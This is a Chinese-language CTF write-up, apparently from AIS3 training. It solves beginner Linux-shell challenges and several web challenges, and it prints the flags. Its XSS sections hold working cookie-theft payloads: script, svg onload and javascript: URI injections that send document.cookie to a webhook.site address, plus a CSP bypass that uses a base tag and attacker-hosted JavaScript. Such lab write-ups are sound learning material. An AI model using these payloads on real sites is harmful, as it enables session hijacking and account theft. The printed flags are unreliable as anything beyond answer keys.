# 第一題 

會基本linux指令即可

```bash=
~ $ ls
challenge-1  challenge-2  challenge-3  challenge-4  challenge-5  challenge-6
~ $ cd challenge-1
~/challenge-1 $ ls
flag
~/challenge-1 $ cat flag
AIS3{C0N9_Y0UR_F1R57_F1A9_😼}
~/challenge-1 $ 
```

# 第二題

隱藏檔案

```bash=
~/challenge-2 $ ls
~/challenge-2 $ ls -al
total 16
drwxr-xr-x    1 user     root          4096 Aug  8 08:04 .
drwxr-sr-x    1 user     user          4096 Aug 10 08:00 ..
-rw-r--r--    1 user     root            31 Aug  7 06:58 .flag
~/challenge-2 $ cat .flag
AIS3{15_a1_W0N7_M155_D07_🚩}
~/challenge-2 $ 
```

# 第三題

touch 創建檔案

```bash=
~/challenge-3 $ ls
flag
~/challenge-3 $ cat flag 
Please create a file named meow under /tmp folder
~/challenge-3 $ touch /tmp/meow
~/challenge-3 $ cat flag
Please create a file named meow under /tmp folder
~/challenge-3 $ AIS3{M30W_M30W_900D_J0B5}
```

# 第四題

mv好用ouo

```bash=
~ $ ls
challenge-1  challenge-2  challenge-3  challenge-4  challenge-5  challenge-6
~ $ cd challenge-4/
~/challenge-4 $ ls
flag  grep
~/challenge-4 $ ./flag 
sh: ./flag: Permission denied
~/challenge-4 $ cat flag 
please move grep into ~/challenge-5/ folder
~/challenge-4 $ mv grep ./../challenge-5
~/challenge-4 $ AIS3{M0V3_M0VE_HURRY_UP!}

```

# 第五題

grep -r 參數

```bash!    
~/challenge-5 $ ./grep AIS3 -r ./maybe_here/    
./maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here.txt:旗下的戰隊「AIS3{M4st3r_0f_S34rch_」更是活躍於各式各樣的資安競賽，並歡迎全臺灣不限年齡的駭客們加入一起學習，每個月也會定期舉辦讀書會分享彼此的研究成果和訓練表達能力。
~/challenge-5 $ 
```

flag好像不完整
找一下}

```bash=
~/challenge-5 $ ./grep } -r ./
./maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here/maybe_here.txt:成大資安社是由社長葉東逸和其他五位夥伴——楊竣鴻、邱昱翔、蔡聿善、佘俊霖、文仁謙於 2023 年 9 月創立的「開源社團」。短短時間內，除了每週線下都有社課和活動外，線上也有直播和完整的課程資源供所有人免費觀看，社團 1$_p0w3rfu11} 也已超過 900 人。
```

# 第六題
rm -rf大法好
```bash!
~/challenge-6 $ ls
flag
~/challenge-6 $ cat fa
cat: can't open 'fa': No such file or directory
~/challenge-6 $ cat flag 
~/challenge-6 $ rm flag 
~/challenge-6 $ ls
~/challenge-6 $ ls AIS3{RM_RF_CHUMMY_/_D0N7_D0_17_PL5}
```

# GET aHEAD

這題打過ㄌ
打開burp
然後把response header改成HEAD就可以了

![image](https://hackmd.io/_uploads/rkdYjxLOgl.png)

# Cookies

輸入他提示的餅乾名稱 發現name參數改了
這邊直接開始爆破餅乾 然後就出flag了

![image](https://hackmd.io/_uploads/S1-7neIdlx.png)

# Inspect HTML

Ctrl+U 之後就可以看到flag

![image](https://hackmd.io/_uploads/Skz3hlLugl.png)

# Bookmarklet

把他的扣直接貼到F12的console然後執行就有FLAG了

![image](https://hackmd.io/_uploads/H1HmTlLdxg.png)

# WebDecode

進去之後就再home、about、contact裡面直接看原始碼

about裡面長這樣:
![image](https://hackmd.io/_uploads/B1eT6g8_eg.png)

然後還有Ctrl+U一串看起來可以decode的字串

拿去base64 decode

![image](https://hackmd.io/_uploads/HJeJAx8uxe.png)

getflag!!!

# XSS1

沒擋任何東西
`<script>alert()</script>`
`<script>fetch("webhooklink"+document.cookie)</script>`

把note分享給admin :3 
記得把http"S"刪掉了，因為bot在內網訪問的關係，所以不需要ssl

喔對然後payload最後的link要加上問號 不然參數傳不過去


`<script>fetch("webhooklink?"+document.cookie)</script>`

![image](https://hackmd.io/_uploads/rJnKe8v_ge.png)

# XSS2

戳戳看一般的payload`<script>alert()</script>`

出現這些![image](https://hackmd.io/_uploads/B1fybUPdle.png)

擷取關鍵字`innerHTML`

用svg onload戳戳看

`<svg onload=alert()>`

彈了，那就來塞webhook吧

`<svg/onload=fetch('https://webhook.site/332db10d-43fd-400a-abf3-c83fe081384e?cookie='+encodeURIComponent(document.cookie));>`

把note分享給admin :3

![image](https://hackmd.io/_uploads/rJgeMIv_xg.png)

# XSS3

Video Button? 先戳一個test看看
![image](https://hackmd.io/_uploads/BkkwGUDOeg.png)
所以注入點在href，那`<script>`呢

![image](https://hackmd.io/_uploads/HJCcM8Pdlg.png)

被編碼掉ㄌ，想到講師有說不用<<><><>的方法

所以我就去查了一下javascript怎麼搓出payload

結果:
`javascript:fetch('https://webhook.site/332db10d-43fd-400a-abf3-c83fe081384e?cookie='+encodeURIComponent(document.cookie));`

把note分享給admin :3 
![image](https://hackmd.io/_uploads/r14NX8wdgl.png)

# XSS4

似曾相似

解法:`CSP bypassing via <base>`

所以我需要一個公網ip可以讓他引入js

不想用ngrok好麻煩->找助教借VPS

所以script.js

```
window.onload = function() {
  document.getElementById("mynote").src = "https://webhook.site/332db10d-43fd-400a-abf3-c83fe081384e?"+document.cookie;
};
```
只要load就往webhook傳餅乾

然後payload則需要將mynote傳給他

所以payload

```
<img id="mynote" src="old_image.jpg">
<base href="http://23.146.248.195:8080/static/script.js">
```

把note分享給admin :33333

![image](https://hackmd.io/_uploads/SyNsELvOee.png)

Thanks 4 your cookie🍪